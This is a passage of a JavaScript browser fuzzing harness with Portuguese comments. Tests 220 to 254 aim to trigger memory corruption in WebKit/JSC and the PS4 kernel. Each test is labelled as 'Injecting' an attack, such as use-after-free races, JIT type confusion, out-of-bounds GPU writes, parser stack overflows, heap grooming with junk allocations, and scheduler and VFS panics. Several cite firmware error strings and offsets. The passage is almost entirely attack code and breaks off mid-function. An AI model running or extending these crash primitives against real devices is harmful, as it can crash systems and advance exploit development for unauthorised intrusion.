                    let i = new Int32Array(e.data);
                    // Espera lock ser libertado (o que nunca acontece normalmente)
                    // O Kernel deve detectar a morte de A e acordar B ou limpar o estado
                    Atomics.wait(i, 0, 1, 1000);
                }
            `], {type:'text/javascript'})));
            
            wA.postMessage(sab);
            setTimeout(() => wB.postMessage(sab), 100);
            
            log("Priority Inheritance logic tested.");
        }
       // 220. TypedArray Constructor Species Race
        // Ataca a forma como TypedArrays são construídos usando Symbol.species.
        // Se conseguirmos alterar o construtor durante a execução do JIT, podemos
        // enganar o motor para alocar um buffer menor do que o esperado.
        function runTest220() {
            log("220. Injecting: TypedArray Species Race...");
            
            class MyArray extends Uint8Array {}
            
            // Espécie maliciosa
            Object.defineProperty(MyArray, Symbol.species, {
                get: function() {
                    // Retorna um construtor que aloca menos memória
                    return function() { return new Uint8Array(1); }
                }
            });

            // Função JIT hot
            function create(C, len) {
                // O JIT pode optimizar a chamada do construtor
                return new C(len); 
            }

            // Treino com array normal
            for(let i=0; i<10000; i++) create(Uint8Array, 100);

            try {
                // Ataque: Usa a classe maliciosa
                let arr = create(MyArray, 1000); 
                // Se o JIT assumiu que 'arr' tem tamanho 1000 mas tem 1...
                arr[500] = 0x41; 
                log("TypedArray species allocation race triggered.");
            } catch(e) { log("Safe: " + e); }
        }

        // 221. DOM Node Iterator Filter UAF
        // O NodeIterator usa um filtro (função JS) para decidir quais nós mostrar.
        // Se o filtro modificar o DOM removendo o nó que está a ser visitado,
        // o iterador interno C++ pode aceder a memória libertada.
        function runTest221() {
            log("221. Injecting: NodeIterator UAF...");
            
            const root = document.createElement('div');
            const child = document.createElement('span');
            root.appendChild(child);
            
            const iter = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
                acceptNode: function(node) {
                    if (node === child) {
                        // MUTAÇÃO: Remove o nó durante a filtragem
                        root.removeChild(child);
                        // Força GC
                        let junk = new ArrayBuffer(1024 * 1024);
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_ACCEPT;
                }
            });

            try {
                iter.nextNode(); // root
                iter.nextNode(); // child (deletado durante o processo)
                log("NodeIterator traversed deleted node.");
            } catch(e) { log("Safe: " + e); }
        }

        // 222. RegExp Match Global State Confusion
        // Funções de replace com RegExp global guardam estado (lastIndex).
        // Se a função de substituição (callback) reiniciar o RegExp ou executá-lo noutra string,
        // o motor de regex pode perder a sincronia e escrever fora do buffer da string de resultado.
        function runTest222() {
            log("222. Injecting: RegExp Global State Confusion...");
            
            let re = /a/g;
            let str = "aaaaa";
            
            // Substituição com efeito colateral
            str.replace(re, function() {
                // Reinicia o índice a meio do loop de substituição
                re.lastIndex = 0;
                return "b";
            });
            
            try {
                // Tenta forçar o estado inválido numa nova execução
                re.exec(str);
                log("RegExp state desync attempted.");
            } catch(e) { log("Safe: " + e); }
        }

        // ==========================================
        //        KERNEL VECTORS (223-225)
        // ==========================================

        // 223. UMTX OP_WAIT Deadlock Fuzzing
        // Baseado em logs "thr_umtx".
        // Usa SharedArrayBuffer para criar condições de espera inválidas no kernel.
        // Passar timeouts negativos ou endereços desalinhados para _umtx_op via Atomics.
        function runTest223() {
            log("223. Injecting: UMTX Deadlock Fuzzing...");
            
            if(!window.SharedArrayBuffer) return log("No SAB support.");
            
            const sab = new SharedArrayBuffer(4096);
            const i32 = new Int32Array(sab);
            
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let i = new Int32Array(e.data);
                    // Tenta esperar com valores limite
                    // Timeout muito curto ou zero para stressar o scheduler
                    while(true) Atomics.wait(i, 0, 0, 0); 
                }
            `], {type:'text/javascript'})));
            
            // Lança múltiplos workers
            for(let i=0; i<8; i++) w.postMessage(sab);
            
            // Main thread acorda aleatoriamente
            let i = setInterval(() => {
                Atomics.notify(i32, 0, 1);
            }, 0);
            
            setTimeout(() => { clearInterval(i); log("UMTX stress ended."); }, 2000);
        }

        // 224. Socket Sendfile UAF Race
        // Tenta usar a syscall sendfile (ou simulação via Blob/Socket) enquanto o ficheiro/blob
        // de origem é truncado ou fechado.
        function runTest224() {
            log("224. Injecting: Socket Sendfile UAF...");
            
            // Blob grande simulando ficheiro
            let blob = new Blob(["A".repeat(1024*1024*10)]); 
            
            // Tenta enviar via XHR/Fetch (que usa sendfile internamente para Blobs grandes)
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "/dev/null"); // Sink
            
            xhr.send(blob);
            
            // Race: Revoga o Blob ou substitui o conteúdo enquanto o envio ocorre
            // No browser, revogar URL ou fechar Worker dono do Blob
            // Aqui simulamos libertando a referência e forçando pressão de memória
            blob = null; 
            let junk = [];
            for(let i=0; i<1000; i++) junk.push(new ArrayBuffer(1024*10));
            
            log("Sendfile/Blob race initiated.");
        }

        // 225. GPU Command Buffer Fence Race
        // Cria objetos de sincronização (Fences) na GPU e tenta "esperar" por eles
        // e "deletá-los" em threads/contextos concorrentes.
        function runTest225() {
            log("225. Injecting: GPU Fence Race...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("WebGL2 required.");
            
            // Cria Fence
            let fence = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
            gl.flush(); // Envia para GPU
            
            // Tenta esperar e deletar no mesmo frame
            try {
                // Wait (bloqueia thread se timeout > 0)
                gl.clientWaitSync(fence, 0, 0);
                
                // Delete imediato
                gl.deleteSync(fence);
                
                // Tenta usar o fence deletado (UAF no driver)
                gl.getSyncParameter(fence, gl.SYNC_STATUS);
                
                log("Fence race executed.");
            } catch(e) { log("Driver safe: " + e); }
        }
  // --- WEBKIT VECTORS ---

    // 226. StructuredClone Stack Smash
    // Tenta estourar a pilha de execução do serializador interno (V8/JSC)
    // criando um objeto profundamente aninhado (não circular) e passando via postMessage.
    function runTest226() {
        log("226. Injecting: Clone Stack Smash...");
        
        // Cria profundidade extrema
        let deep = {};
        let curr = deep;
        for(let i=0; i<30000; i++) {
            curr.next = {};
            curr = curr.next;
        }
        
        try {
            // postMessage usa o algoritmo StructuredClone
            // Se a recursão C++ não tiver proteção de limite, causa Stack Overflow no WebKit
            window.postMessage(deep, "*");
            log("Deep object sent to serializer.");
        } catch(e) {
            log("Serializer limit reached: " + e);
        }
    }

    // 227. Intl.Collator Getter Side-Effect
    // O objeto Intl.Collator (comparação de strings) pode invocar getters do usuário.
    // Se alterarmos o objeto 'this' ou invalidarmos o cache do Collator durante a comparação,
    // podemos causar confusão de tipos no motor de internacionalização (ICU).
    function runTest227() {
        log("227. Injecting: Intl Type Confusion...");
        
        const collator = new Intl.Collator();
        const evil = {
            toString: () => {
                // Efeito colateral: Força GC e tenta invalidar caches internos
                let junk = new ArrayBuffer(1024 * 1024);
                return "a";
            }
        };
        
        try {
            // compare() chama toString() nos argumentos
            collator.compare(evil, "b");
            
            // Tenta em loop para forçar JIT Inline Cache
            for(let i=0; i<1000; i++) collator.compare("a", "b");
            
            log("Intl Collator fuzzing complete.");
        } catch(e) { log("Error: " + e); }
    }

    // 228. AudioWorklet Module Lifetime Race
    // Baseado em logs de "SharedWorker" e Threads.
    // Tenta adicionar um módulo de áudio e fechar o contexto imediatamente.
    // O carregamento do módulo ocorre numa thread separada; o fechamento na main thread.
    function runTest228() {
        log("228. Injecting: AudioWorklet Race...");
        if(!window.AudioContext) return log("No AudioContext.");
        
        const ctx = new AudioContext();
        const blob = new Blob(["registerProcessor('test', class extends AudioWorkletProcessor{process(){return true}})"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        // Race: AddModule (Async) vs Close (Sync/Async)
        ctx.audioWorklet.addModule(url).then(() => {
            log("Module loaded (Too slow for race).");
        }).catch(e => log("Race condition trigger attempted."));
        
        // Fecha imediatamente para deixar o loader do módulo pendurado
        ctx.close(); 
        log("AudioContext closed during module load.");
    }

    // --- KERNEL VECTORS ---

    // 229. CPU Scheduler Affinity Stress
    // Baseado em: "failed to get sysctl kern.sched.cpusetsize".
    // O Kernel gere máscaras de CPU (cpusets) para threads.
    // Criar e destruir Workers massivamente obriga o kernel a calcular e atribuir afinidade de CPU repetidamente.
    function runTest229() {
        log("229. Injecting: Scheduler Affinity Stress...");
        
        const blob = new Blob(["setInterval(()=>{}, 100)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        let workers = [];
        
        let i = setInterval(() => {
            // Spawn burst
            for(let k=0; k<5; k++) {
                workers.push(new Worker(url));
            }
            
            // Kill burst
            if(workers.length > 20) {
                while(workers.length > 0) workers.pop().terminate();
            }
        }, 10);
        
        setTimeout(() => { clearInterval(i); log("Scheduler stress ended."); }, 3000);
    }

    // 230. Blob Vnode Reference Leak
    // Blobs grandes são apoiados por ficheiros temporários (vnodes) no devfs ou tmpfs.
    // Tenta criar um Blob, passá-lo para um worker, revogar a URL e terminar o worker.
    // Visa causar um vazamento de contagem de referência no vnode do kernel.
    function runTest230() {
        log("230. Injecting: Blob Vnode Ref Leak...");
        
        const blob = new Blob(["A".repeat(1024*1024*5)]); // 5MB Blob
        const url = URL.createObjectURL(blob);
        
        const w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = e => {
                // Leitura do blob via XHR
                const x = new XMLHttpRequest();
                x.open('GET', e.data, false); // Síncrono
                x.send();
            }
        `], {type:'text/javascript'})));
        
        w.postMessage(url);
        
        // Revoga imediatamente enquanto o worker tenta ler
        URL.revokeObjectURL(url);
        
        // Termina o worker abruptamente
        setTimeout(() => w.terminate(), 10);
        
        log("Blob/Vnode race initiated.");
    }

    // 231. GPU Transform Feedback Interleaved OOB
    // Transform Feedback com buffer "Interleaved" (dados misturados).
    // Se o driver calcular mal o 'stride' (passo) ou o alinhamento, escreve fora do buffer.
    function runTest231() {
        log("231. Injecting: GPU XForm Interleaved OOB...");
        
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl2');
        if(!gl) return log("WebGL2 N/A");
        
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, "#version 300 es\nvoid main(){gl_Position=vec4(1);}");
        gl.compileShader(vs);
        
        const p = gl.createProgram();
        gl.attachShader(p, vs);
        
        // Define gravação de variável
        gl.transformFeedbackVaryings(p, ["gl_Position"], gl.INTERLEAVED_ATTRIBS);
        gl.linkProgram(p);
        gl.useProgram(p);
        
        const b = gl.createBuffer();
        gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, b);
        // Aloca tamanho ímpar/pequeno para testar alinhamento
        gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 13, gl.DYNAMIC_DRAW); 
        gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, b);
        
        try {
            gl.beginTransformFeedback(gl.POINTS);
            // Desenha 1 ponto. Precisa escrever 16 bytes (vec4). Buffer tem 13 bytes.
            // Driver deve impedir ou crashar.
            gl.drawArrays(gl.POINTS, 0, 1);
            gl.endTransformFeedback();
            log("Interleaved Write OOB command sent.");
        } catch(e) { log("GL Catch: " + e); }
    }
  // 232. DataChannel BinaryType UAF
    // Alvo: "data-channel-failure" (Offset 0x2d140f2)
    // A troca do tipo de binário (blob <-> arraybuffer) durante a recepção de dados
    // pode confundir o manipulador de memória do WebRTC, levando a um UAF.
    function runTest232() {
        log("232. Injecting: DataChannel BinaryType UAF...");
        
        const pc = new RTCPeerConnection();
        const dc = pc.createDataChannel("uaf");
        
        pc.createOffer().then(o => pc.setLocalDescription(o));
        
        // Payload para estressar o buffer
        const data = new Uint8Array(1024 * 16); // 16KB
        data.fill(0x41);

        // Simula recepção e troca rápida
        let i = setInterval(() => {
            try {
                // Alterna tipo rapidamente
                dc.binaryType = (dc.binaryType === 'blob') ? 'arraybuffer' : 'blob';
                // Tenta enviar/receber no estado instável
                dc.send(data);
            } catch(e) {}
        }, 1);
        
        setTimeout(() => { clearInterval(i); pc.close(); log("DataChannel fuzzing ended."); }, 2000);
    }

    // 233. WASM Proxy Import Crash
    // Tenta passar um Proxy revogável ou com efeitos colaterais como objeto de importação
    // para a instanciação do WebAssembly. Se o motor não tratar exceções durante o import, crash.
    function runTest233() {
        log("233. Injecting: WASM Proxy Import Crash...");
        
        const code = new Uint8Array([0,97,115,109,1,0,0,0, 2, 8, 1, 1, 109, 1, 97, 0, 0]); // Import "m.a"
        
        const {proxy, revoke} = Proxy.revocable({}, {
            get: (t, k) => {
                revoke(); // Revoga a si mesmo durante o acesso
                return 1;
            }
        });
        
        try {
            // O engine tenta ler "m.a". O getter revoga o proxy.
            WebAssembly.instantiate(code, {m: proxy}).then(() => {
                log("Instantiated (Safe).");
            }).catch(e => log("Catch: " + e));
        } catch(e) { log("Error: " + e); }
    }

    // 234. JSC Array Butterfly Transition Panic
    // Manipula a estrutura interna "Butterfly" de arrays do JSC.
    // Transiciona de Int32 -> Double -> Contíguo -> Esparso rapidamente.
    // Tenta confundir o Garbage Collector sobre o tamanho real da alocação.
    function runTest234() {
        log("234. Injecting: Array Butterfly Panic...");
        
        let arr = [];
        for(let i=0; i<100; i++) arr[i] = i; // Int32
        
        // Loop de transição
        for(let i=0; i<1000; i++) {
            arr[0] = 1.1; // Transition to Double
            arr[10000] = 1; // Transition to Sparse (Large Butterfly)
            arr.length = 0; // Shrink
            // Aloca algo no espaço liberto
            let tmp = {a: 1, b: 2};
        }
        log("Butterfly stress test executed.");
    }

    // --- KERNEL VECTORS ---

    // 235. Buffer Cache 'tbp->b_bcount' Panic
    // Alvo: "warning: tbp->b_bcount wrong %ld vs %ld" (Offset 0xb18caa)
    // Este erro do Kernel indica corrupção no cache de buffers do sistema de ficheiros (VFS).
    // Usamos Blobs grandes (armazenados em disco/tmpfs) e FileReader para estressar o I/O.
    function runTest235() {
        log("235. Injecting: VFS Buffer Cache Panic...");
        
        // Blob de 10MB (provavelmente vai para disco/swap)
        const blob = new Blob([new Uint8Array(1024*1024*10)]);
        const readers = [];
        
        // 50 Leitores simultâneos lendo slices diferentes
        // Tenta criar condição de corrida no bloqueio do buffer (lockf)
        for(let i=0; i<50; i++) {
            const fr = new FileReader();
            // Lê pedaços aleatórios desalinhados
            const start = Math.floor(Math.random() * 1024*1024*9);
            const slice = blob.slice(start, start + 4096); 
            fr.readAsArrayBuffer(slice);
            readers.push(fr);
        }
        log("VFS Buffer I/O storm initiated.");
    }

    // 236. RTLD Module Unload Race
    // Alvo: "failed orbis_rtld_free_module_info"
    // O Dynamic Linker (RTLD) gere carregamento de bibliotecas.
    // Workers carregam bibliotecas do sistema. Criar/Destruir Workers massivamente estressa o RTLD.
    function runTest236() {
        log("236. Injecting: RTLD Module Race...");
        
        const blob = new Blob(["postMessage('init')"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        let workers = [];
        let i = setInterval(() => {
            // Spawn
            let w = new Worker(url);
            workers.push(w);
            
            // Terminate aleatório (Unload module info)
            if(workers.length > 30) {
                let victim = workers.shift();
                victim.terminate();
            }
        }, 5); // Alta frequência
        
        setTimeout(() => { clearInterval(i); log("RTLD stress ended."); }, 3000);
    }

    // 237. GPU Deleted Buffer Draw Race
    // Tenta desenhar usando um WebGL Buffer que foi deletado numa thread paralela (Worker).
    // Visa causar Use-After-Free no driver da GPU (Gnm).
    function runTest237() {
        log("237. Injecting: GPU Deleted Buffer Race...");
        
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        if(!gl) return log("WebGL N/A");
        
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, 1024, gl.STATIC_DRAW);
        
        // Worker para tentar interferir (embora WebGL seja single-thread, o driver Gnm é multi-thread)
        // Usamos OffscreenCanvas transfer se possível, ou apenas pressão de memória
        
        // Tenta desenhar repetidamente
        for(let i=0; i<100; i++) {
            gl.vertexAttribPointer(0, 3, gl.FLOAT, false, 0, 0);
            gl.enableVertexAttribArray(0);
            gl.drawArrays(gl.TRIANGLES, 0, 3);
            
            // Delete no meio do batch
            if(i === 50) {
                gl.deleteBuffer(buf);
                // Tenta usar após delete
            }
        }
        log("GPU Draw/Delete race command sent.");
    }
 // 238. WeakMap Ephemeron Mark Race
    // "Ephemerons" são pares chave/valor onde o valor só vive se a chave viver.
    // O GC tem uma fase complexa para marcar isso. Criar e destruir WeakMaps massivamente
    // durante a execução de código JIT pode causar acesso a objetos já coletados.
    function runTest238() {
        log("238. Injecting: WeakMap GC Race...");
        
        let wm = new WeakMap();
        let key = {};
        let val = {x: 1};
        wm.set(key, val);

        // Worker para forçar pressão no GC
        const w = new Worker(URL.createObjectURL(new Blob(['onmessage=()=>{let a=[];for(let i=0;i<10000;i++)a.push(new ArrayBuffer(1000))}'],{type:'text/javascript'})));

        // Loop de acesso JIT
        function opt() {
            // Se o GC correr aqui e limpar 'key', 'val' deve sumir.
            // Se o JIT segurar uma referência crua a 'val', temos UAF.
            return wm.get(key); 
        }

        let i = setInterval(() => {
            w.postMessage("gc"); // Trigger GC pressure
            for(let k=0; k<1000; k++) {
                let r = opt();
                if(!r) { 
                    // Se falhar, pode ser normal ou corrupção
                }
            }
        }, 10);
        
        setTimeout(() => { clearInterval(i); w.terminate(); log("GC Ephemeron stress ended."); }, 2000);
    }

    // 239. JIT OSR Entry Type Confusion
    // OSR (On-Stack Replacement) ocorre quando um loop fica "quente" e o motor troca para código compilado.
    // Tenta entrar no código otimizado com tipos de variáveis diferentes dos esperados (ex: Double vs Int).
    function runTest239() {
        log("239. Injecting: JIT OSR Type Confusion...");
        
        function target(arr, x) {
            // Loop para disparar OSR
            for(let i=0; i<10000; i++) {
                // Se 'x' mudar de tipo durante o OSR, 'arr[i] + x' pode calcular endereço errado
                arr[i] = arr[i] + x;
            }
        }

        let arr = new Float64Array(10000);
        // Treino com Double
        target(arr, 1.1);
        
        try {
            // Ataque: Passa objeto com valueOf instável
            let evil = { valueOf: () => { return 2.2; } };
            target(arr, evil);
            log("OSR triggered with object type.");
        } catch(e) { log("JIT Bailout: " + e); }
    }

    // 240. RegExp Search String Overflow
    // Strings gigantes passadas para RegExp podem causar Integer Overflow no cálculo do buffer de busca.
    function runTest240() {
        log("240. Injecting: RegExp Search Overflow...");
        
        try {
            // String enorme (quase 512MB)
            let s = "A".repeat(1024*1024*512); 
            // Regex que exige backtracking
            let re = /(A+)+B/; 
            // Executa busca. Se o alocador falhar no kernel, panic.
            re.test(s);
        } catch(e) {
            log("RegExp engine caught limit: " + e.message);
        }
    }

    // --- KERNEL VECTORS ---

    // 241. MADV_FREE Page Reclaim Race
    // Baseado em comportamento do FreeBSD VM.
    // Tenta escrever em páginas de memória que estão marcadas para serem libertadas pelo sistema (lazy free).
    function runTest241() {
        log("241. Injecting: MADV_FREE Race...");
        
        const w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = e => {
                let b = e.data;
                // Escreve e devolve rápido (Transferable)
                // Transferir marca a memória como "não usada" na thread origem
                new Int32Array(b)[0] = 1;
                postMessage(b, [b]);
            }
        `], {type:'text/javascript'})));

        let buf = new ArrayBuffer(1024 * 64);
        
        let i = setInterval(() => {
            // Envia (Detach)
            w.postMessage(buf, [buf]);
        }, 0);

        w.onmessage = e => {
            // Recebe de volta. Tenta ler imediatamente.
            // Se houver race no kernel mapping, podemos ler lixo ou causar page fault.
            buf = e.data;
            if(new Int32Array(buf)[0] !== 1) log("Memory Corruption Detected!");
        };
        
        setTimeout(() => { clearInterval(i); w.terminate(); log("VM Page race ended."); }, 2000);
    }

    // 242. Scheduler CPU Affinity Flood
    // Alvo: "failed to get sysctl kern.sched.cpusetsize" (Offset 0x3a7b7)
    // O PS4 tem núcleos reservados para o SO e para Jogos.
    // Criar workers força o kernel a decidir em qual núcleo rodar a thread.
    // Fazer isso em loop infinito estressa a lógica de afinidade (cpuset).
    function runTest242() {
        log("242. Injecting: Scheduler Affinity Flood...");
        
        let workers = [];
        const maxWorkers = navigator.hardwareConcurrency * 4; // Sobrecarga
        
        const blob = new Blob(["while(1);"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        let i = setInterval(() => {
            if(workers.length < maxWorkers) {
                workers.push(new Worker(url));
            } else {
                // Termina metade para forçar rebalanceamento
                let w = workers.shift();
                w.terminate();
            }
        }, 5);
        
        setTimeout(() => { 
            clearInterval(i); 
            workers.forEach(w => w.terminate()); 
            log("Scheduler stress test done."); 
        }, 3000);
    }

    // 243. GPU Compute Thread Group Overflow
    // WebGL 2 Compute (se disponível ou via extensão) permite definir grupos de threads locais.
    // Definir dimensões (x, y, z) que excedam o limite de hardware pode causar buffer overflow na GPU.
    function runTest243() {
        log("243. Injecting: GPU Thread Group Overflow...");
        
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl2-compute');
        if(!gl) return log("WebGL2 Compute N/A - Trying standard draw overload");
        
        // Fallback para WebGL2 normal se Compute não existir (muito comum)
        // Tentamos instanced draw com contagem absurda
        const gl2 = c.getContext('webgl2');
        if(gl2) {
            const ext = gl2.getExtension("ANGLE_instanced_arrays");
            const p = gl2.createProgram();
            // ... setup shader ...
            // Draw instanced com contagem Max Int32
            // Driver deve validar, mas se passar para o hardware -> Hang/Crash
            try {
                gl2.drawArraysInstanced(gl2.POINTS, 0, 1, 2147483647);
                log("Instanced draw overflow command sent.");
            } catch(e) { log("Driver safe: " + e); }
        }
    }
  // --- WEBKIT VECTORS ---

    // 244. Dynamic Import Module Race
    // Alvo: "Importing a module script failed." (Offset 0x2e15d...)
    // O carregador de módulos é assíncrono. Tenta carregar um módulo via import()
    // e destruir o contexto (iframe/worker) antes da conclusão.
    function runTest244() {
        log("244. Injecting: Module Loader Race...");
        
        // Blob que é um módulo ES6
        var blob = new Blob(["export const x = 1;"], {type: 'text/javascript'});
        var url = URL.createObjectURL(blob);
        
        // Iframe descartável
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        
        try {
            // Inicia importação dinâmica dentro do iframe
            f.contentWindow.eval('import("' + url + '").catch(e=>{})');
            
            // Destrói o iframe imediatamente (Race condition no loader)
            // Se o WebKit tentar escrever o resultado do import num contexto morto -> Crash
            setTimeout(function() {
                document.body.removeChild(f);
                log("Module load interrupted.");
            }, 0);
        } catch(e) { log("Error: " + e); }
    }

    // 245. JS Parser Stack Overflow
    // Alvo: "grammar-error" (Offset 0x2d04eed)
    // Cria uma string de código com aninhamento profundo de parênteses/blocos
    // para estourar a pilha do parser recursivo do JSC antes da execução.
    function runTest245() {
        log("245. Injecting: Parser Stack Overflow...");
        
        try {
            // Gera código: (((...((1))...)))
            var depth = 50000;
            var code = "return " + "(".repeat(depth) + "1" + ")".repeat(depth);
            
            // O erro "grammar-error" ou "stack overflow" deve ocorrer no parsing
            var func = new Function(code);
            log("Parser survived depth: " + depth);
        } catch(e) {
            log("Parser trap triggered: " + e.message);
        }
    }

    // 246. ImageBitmap Thread Violation
    // Alvo: "CRASH() when more than one threads are registered"
    // Transfere um ImageBitmap (recurso de GPU) entre Workers e tenta usá-lo
    // simultaneamente, forçando a verificação de thread ownership a falhar.
    function runTest246() {
        log("246. Injecting: ImageBitmap Thread Violation...");
        
        var canvas = document.createElement('canvas');
        createImageBitmap(canvas).then(function(bmp) {
            var w1 = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage(e.data,[e.data])}'],{type:'text/javascript'})));
            var w2 = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("done")}'],{type:'text/javascript'})));
            
            // Ping-pong rápido
            w1.postMessage(bmp, [bmp]);
            w1.onmessage = function(e) {
                // Tenta passar para W2 enquanto o GC ou W1 ainda podem ter referências
                // O alvo é confundir o registo de "Thread Owner" na VM
                try { w2.postMessage(e.data, [e.data]); } catch(z){}
            };
        });
        log("Bitmap ownership race initiated.");
    }

    // --- KERNEL VECTORS ---

    // 247. Scheduler CPU Affinity Flood
    // Alvo: "failed to get sysctl kern.sched.cpusetsize" (Offset 0x3a7b7)
    // O kernel precisa alocar estruturas de "cpuset" para cada thread.
    // Criamos workers (threads) com nomes longos (se suportado) ou apenas volume
    // para estressar a syscall de afinidade.
    function runTest247() {
        log("247. Injecting: Scheduler Affinity Flood...");
        
        var blob = new Blob(["setInterval(()=>{}, 1000)"], {type:'text/javascript'});
        var url = URL.createObjectURL(blob);
        var workers = [];
        
        // Criação e destruição agressiva
        var i = setInterval(function() {
            for(var k=0; k<5; k++) {
                // Workers consomem recursos do scheduler
                workers.push(new Worker(url));
            }
            // Mantém pressão constante de ~50 threads vivas
            if(workers.length > 50) {
                var w = workers.shift();
                w.terminate(); // Syscall thread_exit
            }
        }, 10);
        
        setTimeout(function() { clearInterval(i); log("Scheduler stress ended."); }, 3000);
    }

    // 248. Malloc Alignment Panic
    // Alvo: "__asan_malloc_replace" (Indica presença de verificações de memória)
    // Tentamos alocações com alinhamento bizarro (ex: Float64 em offset ímpar)
    // para disparar verificações de alinhamento ou hooks do ASAN que sobraram.
    function runTest248() {
        log("248. Injecting: Unaligned Malloc Stress...");
        
        try {
            var buf = new ArrayBuffer(128);
            var view = new DataView(buf);
            
            // Acesso desalinhado (Offset 1 para float64 é ilegal em muitas arquiteturas, x86 tolera mas ASAN odeia)
            for(var i=0; i<10000; i++) {
                view.setFloat64(1, 1.2345678);
                var val = view.getFloat64(1);
            }
            log("Unaligned access executed.");
        } catch(e) { log("Error: " + e); }
    }

    // 249. Gamepad Sensor Init Race
    // Alvo: "camera : Accelerometer setup failed" (Offset 0xb00a42)
    // O driver do DualShock 4 inicializa acelerômetros.
    // Chamamos getGamepads() em loop enquanto alteramos o estado de vibração.
    // Visa causar uma condição de corrida durante o setup do dispositivo I2C/USB virtual.
    function runTest249() {
        log("249. Injecting: Gamepad Sensor Init Race...");
        
        var i = setInterval(function() {
            var gps = navigator.getGamepads();
            var pad = gps[0];
            if (pad && pad.vibrationActuator) {
                // Tenta usar o hardware enquanto o sistema faz polling
                try {
                    pad.vibrationActuator.playEffect("dual-rumble", {
                        duration: 10,
                        weakMagnitude: Math.random(),
                        strongMagnitude: Math.random()
                    });
                } catch(e) {}
            }
        }, 5); // Polling muito rápido (5ms)
        
        setTimeout(function() { clearInterval(i); log("Sensor race finished."); }, 2000);
    }
 // 250. FontFaceSet Iterator Invalidation UAF
    // Itera sobre as fontes carregadas e limpa o conjunto (clear/delete) dentro do loop.
    // O iterador C++ pode tentar acessar um ponteiro de fonte que acabou de ser destruído.
    function runTest250() {
        log("250. Injecting: FontFaceSet Iterator UAF...");
        
        // Carrega algumas fontes dummy
        for(let i=0; i<100; i++) {
            let f = new FontFace("F"+i, "url(data:font/woff;base64,AAEAAA...)");
            document.fonts.add(f);
        }

        try {
            document.fonts.forEach(function(f, f2, set) {
                // Mutação Destrutiva: Limpa tudo no primeiro passo
                set.clear();
                
                // Tenta acessar propriedades da fonte deletada
                // Se o iterador não tiver proteção "keep-alive", crash.
                let s = f.status;
                
                // Alocação para preencher memória liberta
                let junk = new Uint8Array(1024);
            });
            log("FontFace iterator race executed.");
        } catch(e) { log("Safe: " + e); }
    }

    // 251. DOMParser Recursive Stack Exhaustion
    // Cria um XML com profundidade extrema de tags aninhadas.
    // O parser XML do WebKit muitas vezes usa recursão na Stack. Profundidade excessiva = Stack Overflow.
    function runTest251() {
        log("251. Injecting: XML Parser Stack Overflow...");
        
        let depth = 5000;
        let xml = "<a>".repeat(depth) + "</a>".repeat(depth);
        let parser = new DOMParser();
        
        try {
            parser.parseFromString(xml, "text/xml");
            log("Parser survived depth: " + depth);
        } catch(e) {
            log("Parser trap triggered: " + e);
        }
    }

    // 252. ArrayBuffer Non-Power-of-2 Allocator Stress
    // Alvo: "Cannot allocate a buffer of this size" (0x2dad419)
    // Alocadores (bmalloc) otimizam para potências de 2. Tamanhos primos ou estranhos (ex: 2^n - 1)
    // podem cair em "slow paths" ou cálculos de fronteira errados.
    function runTest252() {
        log("252. Injecting: Allocator Boundary Stress...");
        
        // Tamanhos problemáticos
        let sizes = [
            1024*1024*10 - 1, // Logo antes de um limite
            1024*1024*10 + 1, // Logo depois
            2147483647,       // Max Int32
            0xFFFFFFFF        // Max Uint32 (Overflow check)
        ];
        
        sizes.forEach(s => {
            try {
                let ab = new ArrayBuffer(s);
                // Se alocar, tenta usar para garantir que a memória existe
                let v = new Uint8Array(ab);
                v[s-1] = 1; 
            } catch(e) {}
        });
        log("Allocation boundaries tested.");
    }

    // --- KERNEL VECTORS ---

    // 253. VFS Buffer Cache Misalign Panic
    // Alvo: "warning: tbp->b_bcount wrong" (0xb18caa)
    // O erro sugere que o contador de bytes do buffer (b_bcount) não bate com o esperado.
    // Isso acontece em I/O desalinhado. Usamos FileReader em um Blob grande, mas lendo
    // offsets ímpares (não alinhados a 512 bytes).
    function runTest253() {
        log("253. Injecting: VFS Buffer Cache Panic...");
        
        let blob = new Blob([new Uint8Array(1024*1024)]); // 1MB
        
        // Lê em offsets que quebram o alinhamento de setor (512 bytes)
        // Offset 1, 3, 513...
        for(let i=0; i<100; i++) {
            let offset = (i * 512) + 1; // Desalinhado
            let slice = blob.slice(offset, offset + 128);
            let fr = new FileReader();
            fr.readAsArrayBuffer(slice);
        }
        log("Misaligned I/O storm initiated.");
    }

    // 254. 'luke_mthread_elem' Alloc Exhaustion
    // Alvo: "%s: failed to allocate luke_mthread_elem" (0xb12610)
    // Parece ser uma estrutura customizada da Sony ("luke"?). Ligada a threads.
    // Vamos criar Workers e MessageChannels (que usam threads/locks internos) até o limite.
    function runTest254() {
        log("254. Injecting: Custom Thread Elem Exhaustion...");
        
        let workers = [];
        let channels = [];
        
        let i = setInterval(() => {
            try {
                // Tenta consumir slots de thread
                let w = new Worker(URL.createObjectURL(new Blob([''], {type:'text/javascript'})));
                workers.push(w);
                
                // Consome recursos de IPC
                channels.push(new MessageChannel());
                
                // Limita para manter o sistema vivo mas estressado
                if(workers.length > 60) workers.shift().terminate();
